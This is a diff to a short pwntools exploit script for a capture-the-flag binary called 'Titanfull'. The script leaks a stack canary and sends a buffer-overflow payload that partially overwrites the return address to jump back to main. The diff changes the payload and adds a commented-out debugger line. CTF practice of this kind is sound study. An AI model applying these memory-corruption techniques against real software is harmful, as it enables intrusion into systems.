@@ -1,6 +1,7 @@
 from pwn import *
 
 rem = process("./Pwnable/Titanfull/problem/titanfull")
+# gdb.attach(rem)
 
 elf = ELF("./Pwnable/Titanfull/problem/titanfull")
 
@@ -12,7 +13,7 @@ rem.recvuntil(b"0x")
 canary = int(rem.recvn(16), 16)
 
 rem.sendlineafter(b"> ", b"7274")
-payload = b"A" * 0x18 + p64(canary) + p64(bss_addr) + p64(main_addr)[0:2]
-rem.sendlineafter(b": ", payload)
+payload = b"A" * 0x18 + p64(canary) + b"A" * 8 + p64(main_addr)[0:1]
+rem.sendafter(b": ", payload)
 
 rem.interactive()
